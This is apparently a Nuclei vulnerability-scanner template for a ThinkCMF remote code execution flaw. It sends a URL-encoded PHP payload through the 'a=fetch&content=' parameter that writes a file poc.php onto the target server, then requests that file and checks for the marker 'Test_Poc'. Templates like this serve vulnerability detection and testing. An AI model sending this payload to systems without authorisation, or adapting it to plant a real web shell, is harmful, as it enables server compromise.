id: thinkcmf-rce

info:
  name: ThinkCMF RCE
  author: pikpikcu
  severity: critical
  reference: https://www.freebuf.com/vuls/217586.html

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?a=fetch&content=%3C?php+file_put_contents(%22poc.php%22,%22%3C?php+echo+Test_Poc%3B%22)%3B"
  - method: GET
    path:
      - "{{BaseURL}}/poc.php"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Test_Poc"

      - type: status
        status:
          - 200
